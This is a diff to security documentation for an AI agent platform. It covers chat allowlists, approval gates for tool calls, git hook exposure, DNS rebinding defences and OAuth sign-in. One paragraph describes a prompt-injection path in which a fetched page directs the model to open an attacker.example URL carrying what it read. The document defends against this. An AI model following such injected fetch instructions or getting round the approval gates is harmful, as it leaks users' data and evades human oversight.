@@ -56,8 +56,11 @@ of the five-minute delivery cache, so authorized approvals survive cache
 expiry and restarts. Missing or mismatched identity is refused before reading
 the graph. An approval command cannot create its own thread ownership.
 `KAZMA_GATEWAY_ADMINS`, when set, is authoritative; otherwise the platform's
-configured user allowlist grants admin status. An empty allowlist allows
-chatting and grants no administrator privileges.
+configured user allowlist grants admin status. An empty allowlist makes the
+chat app private (since 2026-11-11): only the owner's own account Kazma
+already knows may chat, and it is the administrator; with
+`KAZMA_GATEWAY_OPEN_TO_EVERYONE=1` everyone may chat and no one else is an
+administrator. See [Who a chat app answers](./gateways-and-platforms.md#who-it-answers).
 
 Enabling `/yolo`, `/unrestricted` or `/long yolo` also requires a gateway
 administrator. These handlers check authorization before activation; adding
@@ -104,7 +107,36 @@ There is **no** `create_supervisor_graph()` factory. Do not pin `app.py` line nu
 
 If `hitl_config` is falsy, **all** tools skip this gate. That is why every resumable build site must pass it.
 
+**A fetch after outside text asks, narrowly.** `read_url`, `crawl_site` and
+`web_search` need no approval. Once a turn has read outside text (a web page,
+search results, a mail, a document, an MCP resource: any tool output that
+reached the model inside a data fence, see [section 10](#10-the-prompt-fence--what-it-stops-measured)),
+a call that fetches a URL asks for approval only when its site was named
+neither in your message nor in a search result of the same turn, and is not
+Kazma's own address (`KAZMA_PUBLIC_URL`). The card says why, in your
+language. YOLO and a standing grant skip it like any other card. A swarm
+task is judged the same way against its own text (`safety/outside_text_fetch.py`).
+This closes the path where a page tells the model to open
+`https://attacker.example/?d=<what it read>`; reading what you asked for, and
+what a search found, stays card-free.
+
+**`shell_exec` git.** The approval card for a git command `shell_exec` runs
+names what the repository's own configuration makes git start: hook files
+(not `.sample`), filter, diff and merge drivers, `core.sshCommand`,
+`core.pager`, and a shell alias when it is the command. Every such command
+runs with `-c core.fsmonitor=false`. Nothing else is switched off, so LFS and
+your own hooks keep working; the card is the gate (`safety/git_repo_programs.py`).
+
 Web paints from `_serverGates` / TurnDocument (`chat.js`). `close_turn` keeps the turn **open** while a pending row exists. Absence of a row is an unregistered pending gate (backfill), never an inferred Approved stamp.
+
+The registry keeps no credential. A row holds the call's arguments as an
+approval card shows them (secret-named arguments, a tool's own secret
+arguments and URL passwords hidden), the card's payload and message masked the
+same way, and `args_digest`: the hash of the real arguments, the one the
+swarm card's footer and the Swarm page show. Two calls that differ only in a
+hidden value are two questions. Rows an older build stored raw are masked
+once when the registry opens, keeping their digest. Running the tool never
+reads this row: it reads the checkpoint.
 
 ### Auth: `KAZMA_SECRET` vs opaque sessions
 
@@ -290,7 +322,7 @@ the code.
 
 ### 6.3 HITL endpoint secret
 
-`POST /api/approve/{thread_id}` is protected by session / `KAZMA_SECRET` (`secrets.compare_digest`). `get_kazma_secret()` resolves env → `KAZMA_AUTH_DISABLED` → pytest skip → DB `security.secret` → auto-generate. Off localhost, always set `KAZMA_SECRET`. `KAZMA_AUTH_DISABLED` is for one machine: the boot guard refuses it on a non-loopback bind or behind a declared proxy (`KAZMA_TRUSTED_PROXIES`: a tunnel on the same machine makes a loopback bind public), and while it is set a request that came through a proxy is answered 503.
+`POST /api/approve/{thread_id}` is protected by session / `KAZMA_SECRET` (`secrets.compare_digest`). `get_kazma_secret()` resolves env → `KAZMA_AUTH_DISABLED` → pytest skip → DB `security.secret` → auto-generate. Off localhost, always set `KAZMA_SECRET`. `KAZMA_AUTH_DISABLED` is for one machine: the boot guard refuses it on a non-loopback bind or behind a declared proxy (`KAZMA_TRUSTED_PROXIES`: a tunnel on the same machine makes a loopback bind public), and while it is set a request that came through a proxy is answered 503. A request from this machine is answered 421 when its `Host` is not a name of this machine: `localhost`, an IP address, this machine's own name (with or without its domain), a name ending in `.localhost` or `.test`, the host of `KAZMA_PUBLIC_URL` / `KAZMA_CORS_ORIGINS`, or a name listed in `KAZMA_AUTOLOGIN_HOSTS`. A page on another site that makes its own name point at 127.0.0.1 (DNS rebinding) is refused that way; a name without a dot is accepted only when it is one of those, since the network's search suffix or another machine on the LAN can answer for any such name.
 
 ---
 
@@ -330,6 +362,7 @@ Each check measures the property it names, using the same answer the rest of Kaz
 | `check_encrypted_communications` | Whether traffic from other machines arrives over TLS. Reachable only locally passes. If Kazma is exposed (a non-loopback bind, or a declared proxy), `KAZMA_PUBLIC_URL` must be an `https://` address. | high |
 | `check_audit_logging` | The approval registry (`hitl_gates.db`): it is on (`KAZMA_GATE_REGISTRY`) and readable. The message gives the number of decisions it holds. | high |
 | `check_permission_escalation` | Calls in product code that run a shell or evaluate code: `subprocess` with `shell=` true or decided at run time, `os.system`, `os.popen`, `subprocess.getoutput`, `create_subprocess_shell`, `eval`, `exec`. Import aliases are resolved. Each call is checked against `_REVIEWED_SITES`, which records why the site is safe. Today it has one entry: operator tool hooks. | critical |
+| `check_searxng_secret` | Kazma's SearXNG container (`docker inspect`): its `SEARXNG_SECRET`, else the `secret_key` of the settings file it mounts, must not be the placeholder the shipped files carry. `kazma setup install --with private_search` writes a generated one and starts the container again. The value is compared, never shown. | medium |
 
 A check that cannot run is reported as failed, with its reason; the other checks still run. Until 2026-10-02, four checks passed on a keyword found anywhere, and four failed on findings that were not true (a package cache inside the install, requirement minimums sent to OSV, the wrong manifest file name). `fix_issues`, which wrote a `.env` into the install and was never called, was removed.
 
@@ -372,7 +405,7 @@ SQLite `kazma-data/disclosure.db` enforces the transition chain `submitted → a
 6. **Do not set `allow_headless_danger=True` in production.** It's the test/dev escape hatch.
 7. **Run as the non-root `kazma` user** in Docker (the Dockerfile already does this).
 8. **Bind `127.0.0.1`** unless you have a reverse proxy + `KAZMA_SECRET` in place.
-9. **Multi-operator: set platform allowlists + `KAZMA_GATEWAY_STRICT_ALLOWLIST=1`** (2026-08-19) — by default the Telegram/Discord/Slack adapters run allow-all for backward compatibility with single-operator installs; strict mode fails closed on an empty allowlist.
+9. **Set each chat app's allowlist** — since 2026-11-11 a Telegram/Discord/Slack bot with an empty allowlist is private: it answers only the owner's own account Kazma already knows (a private Telegram chat Kazma pages you in, or a `platform:id` entry of `KAZMA_GATEWAY_ADMINS`) and tells a refused sender in a direct message, once a day, that it is private. `KAZMA_GATEWAY_OPEN_TO_EVERYONE=1` brings back the old answer-anyone posture and is warned at every boot; leave it off. Before 2026-11-11 the adapters answered anyone unless `KAZMA_GATEWAY_STRICT_ALLOWLIST=1` was set.
 10. **Leave `KAZMA_HITL_CANONICAL_FLOOR` unset** — the floor is on by default, and `0` would let the danger-tool approval list be narrowed below the canonical set.
 11. **Set `KAZMA_TRUSTED_PROXIES`** when behind nginx/Caddy/Docker. Peer `127.0.0.1` is not a credential.
 12. **Do not pin scraping through `proxy=`.** Direct hops use `PinHostAsyncTransport`; peer-private abort always.
@@ -395,6 +428,8 @@ These sit **beside** HITL, not inside it.
 | SSRF pin-IP | `validate_url` returns public IPs; `PinHostAsyncTransport` when no proxy; `assert_peer_public` after each hop |
 | Errors | API `safe_error` / `validation_error`; no internals in 4xx/5xx bodies |
 | Fenced tool output | Fetched pages / search / MCP resources go through `fence_untrusted` — see [section 10](#10-the-prompt-fence--what-it-stops-measured) |
+| OAuth sign-ins (GitHub, Google, Microsoft) | Each is one attempt, started by a POST from Kazma's page, bound to that browser by a cookie, kept ten minutes and used once at the callback (`kazma_core/security/oauth_attempts.py`, `kazma_ui/oauth_sign_in.py`) |
+| No popup sign-in | Every sign-in runs in the same tab and the provider sends the browser back; every page sends `Cross-Origin-Opener-Policy: same-origin`, so no page shares a window opener with another site (`tests/test_no_popup_sign_in.py`) |
 
 CI: `tests/test_audit_2026_08_29_regressions.py`, `tests/test_audit_wave8.py`, `test_every_registered_tool_has_a_tier`.
 
